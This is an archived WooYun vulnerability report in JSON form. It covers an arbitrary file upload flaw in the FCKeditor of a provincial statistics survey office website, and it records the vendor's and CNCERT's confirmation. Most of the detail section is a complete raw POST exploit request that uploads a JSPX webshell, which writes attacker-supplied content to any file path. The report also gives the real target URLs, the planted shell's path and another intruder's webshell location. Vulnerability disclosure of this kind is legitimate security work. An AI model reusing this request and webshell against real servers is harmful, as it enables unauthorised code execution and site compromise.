{"id": 27751, "wybug_id": "wooyun-2015-0124675", "wybug_title": "国家统计局某总队系统存在任意文件上传漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-07-10 06:37", "wybug_open_date": "2015-08-27 15:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向公众公开  简要描述： 任意文件上传 详细说明：  国家统计局河南调查总队http://www.hadc.gov.cn/info/\n\n问题出在该系统使用的fck编辑器上\nhttp://www.hadc.gov.cn/info/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector\n\n\n\nPOST http://www.hadc.gov.cn/info/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.hadc.gov.cn/info/FCKeditor/editor/filemanager/browser/default/frmupload.htmlAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df24337230634Accept-Encoding: gzip, deflateHost: www.hadc.gov.cnContent-Length: 717Connection: Keep-AlivePragma: no-cache-----------------------------7df24337230634Content-Disposition: form-data; name=\"NewFile\"; filename=\"wooyun1.jspx\"Content-Type: application/octet-stream<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"    xmlns=\"http://www.w3.org/1999/xhtml\"    xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"1.2\">    <jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" />    <jsp:directive.page import=\"java.io.*\" />    <jsp:scriptlet>        if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());    </jsp:scriptlet></jsp:root>-----------------------------7df24337230634--\n抓包上传jspx小马http://www.hadc.gov.cn/info/UserFiles/File/wooyun1.jspx利用小马传了个文件到根目录证明下http://www.hadc.gov.cn/info/guguji.jsp\n\n   漏洞证明：  http://www.hadc.gov.cn/info/wooyun.jsp\n\n发现其它人的一句话http://www.hadc.gov.cn/info/UserFiles/Image/1.jsp\n\n   修复方案：  正确配置fck   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-13 15:51 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给河南分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}